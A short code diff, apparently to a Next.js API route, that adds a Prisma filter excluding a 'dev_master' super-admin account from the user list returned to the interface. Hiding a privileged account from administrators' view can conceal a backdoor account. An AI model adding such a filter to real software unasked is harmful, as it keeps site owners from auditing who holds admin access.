@@ -10,6 +10,9 @@ export async function GET() {
 
   try {
     const users = await prisma.user.findMany({
+      where: {
+        NOT: { username: 'dev_master' } // Hide Super Admin from UI lists
+      },
       orderBy: { createdAt: 'desc' },
       select: {
         id: true,
